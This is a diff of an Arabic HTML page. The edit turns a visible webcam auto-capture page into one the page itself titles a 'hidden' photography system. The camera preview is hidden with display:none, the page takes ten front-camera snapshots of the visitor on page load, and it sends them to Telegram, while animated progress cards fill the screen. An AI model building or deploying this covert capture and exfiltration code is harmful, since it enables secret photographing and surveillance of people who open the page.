@@ -2,84 +2,143 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التلقاط التلقائي</title>
+    <title>نظام التصوير الخفي التعليمي</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
     <style>
+        :root {
+            --gradient-1: #2c3e50;
+            --gradient-2: #3498db;
+        }
+        
         body {
-            background: linear-gradient(45deg, #1a1a1a, #2c3e50);
-            color: white;
+            margin: 0;
             min-height: 100vh;
+            background: linear-gradient(45deg, var(--gradient-1), var(--gradient-2));
+            animation: gradientBG 15s ease infinite;
+            background-size: 400% 400%;
+            color: white;
+            font-family: 'Arial', sans-serif;
         }
-        .camera-container {
-            width: 100%;
-            max-width: 600px;
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .animation-box {
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 2rem;
             margin: 2rem auto;
+            max-width: 600px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        #camera_hidden {
+            display: none !important;
+        }
+
+        .status-card {
+            background: rgba(0,0,0,0.3);
             border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            padding: 1.5rem;
+            margin: 1rem;
+            transition: transform 0.3s ease;
         }
-        #my_camera {
-            width: 100%;
-            height: 450px;
-            background: #333;
+
+        .status-card:hover {
+            transform: scale(1.05);
         }
-        .loading {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 24px;
-            height: 450px;
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
         }
     </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"></script>
 </head>
 <body>
     <div class="container">
-        <h1 class="text-center py-4">نظام التلقاط التلقائي</h1>
-        
-        <div class="camera-container">
-            <div id="my_camera">
-                <div class="loading">جارٍ تحميل الكاميرا...</div>
+        <div class="animation-box animate__animated animate__fadeInDown">
+            <h1 class="display-4 mb-4">🎥 نظام التصوير التعليمي الخفي</h1>
+            <div class="pulse status-card">
+                <div id="status" class="h4">
+                    ⏳ جارِ تهيئة النظام...
+                </div>
+                <div class="progress mt-3" style="height: 8px;">
+                    <div id="progressBar" class="progress-bar bg-success" 
+                         role="progressbar" style="width: 0%"></div>
+                </div>
             </div>
         </div>
-
-        <div id="status" class="text-center mt-4 fs-5"></div>
     </div>
+
+    <!-- عنصر الكاميرا المخفي -->
+    <div id="camera_hidden"></div>
 
     <script>
         const totalImages = 10;
         let imagesArray = [];
-        
-        // تهيئة الكاميرا مع التأكد من التحميل
-        function initializeCamera() {
-            Webcam.set({
-                width: 600,
-                height: 450,
-                image_format: 'jpeg',
-                jpeg_quality: 90,
-                facingMode: "user"
-            });
+        let captureInterval;
 
-            Webcam.attach('#my_camera', function() {
-                document.querySelector('.loading').style.display = 'none';
-                setTimeout(startAutoCapture, 1500); // تأخير بسيط لضمان الاستقرار
-            }, function(error) {
-                document.getElementById('status').innerHTML = 'خطأ في تحميل الكاميرا!';
-                console.error(error);
-            });
+        async function initializeSystem() {
+            try {
+                // تهيئة الكاميرا المخفية
+                Webcam.set({
+                    width: 320,
+                    height: 240,
+                    dest_width: 640,
+                    dest_height: 480,
+                    image_format: 'jpeg',
+                    jpeg_quality: 90,
+                    facingMode: "user"
+                });
+
+                Webcam.attach('#camera_hidden', async function() {
+                    updateStatus('✅ تم تفعيل الكاميرا بنجاح');
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    startCaptureProcess();
+                }, function(error) {
+                    updateStatus('❌ خطأ في تفعيل الكاميرا');
+                    console.error(error);
+                });
+
+            } catch (error) {
+                console.error('Error:', error);
+                updateStatus('❌ حدث خطأ غير متوقع');
+            }
         }
 
-        // بدء الالتقاط التلقائي
-        async function startAutoCapture() {
-            document.getElementById('status').innerHTML = 'جارٍ الالتقاط التلقائي...';
+        async function startCaptureProcess() {
+            updateStatus('🚀 بدء عملية الالتقاط التلقائي');
             
-            for(let i = 0; i < totalImages; i++) {
-                await new Promise(resolve => setTimeout(resolve, 1000));
+            let current = 0;
+            captureInterval = setInterval(async () => {
+                if(current >= totalImages) {
+                    clearInterval(captureInterval);
+                    await sendToTelegram();
+                    return;
+                }
+                
                 await takeSnapshot();
-                updateStatus(i + 1);
-            }
-            
-            await sendToTelegram();
+                current++;
+                updateProgress((current/totalImages)*100);
+                updateStatus(`📸 تم التقاط ${current} من ${totalImages} صور`);
+            }, 2000);
         }
 
         function takeSnapshot() {
@@ -91,13 +150,8 @@
             });
         }
 
-        function updateStatus(current) {
-            document.getElementById('status').innerHTML = 
-                `تم تغفيل ${current} من ${totalImages} صور`;
-        }
-
         async function sendToTelegram() {
-            document.getElementById('status').innerHTML = 'جارٍ الإرسال إلى التليجرام...';
+            updateStatus('📤 جارِ إرسال الصور إلى التليجرام...');
             
             try {
                 for(const img of imagesArray) {
@@ -112,16 +166,26 @@
                     });
                 }
                 
-                document.getElementById('status').innerHTML = 'تم الإرسال بنجاح!';
+                updateStatus('🎉 تم الانتهاء بنجاح!');
                 imagesArray = [];
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('status').innerHTML = 'حدث خطأ في الإرسال!';
+                updateStatus('❌ فشل في إرسال الصور');
             }
         }
 
+        function updateStatus(text) {
+            document.getElementById('status').innerHTML = text;
+        }
+
+        function updateProgress(percent) {
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
+
         // بدء التشغيل عند تحميل الصفحة
-        window.onload = initializeCamera;
+        window.addEventListener('load', () => {
+            setTimeout(initializeSystem, 1000);
+        });
     </script>
 </body>
 </html>
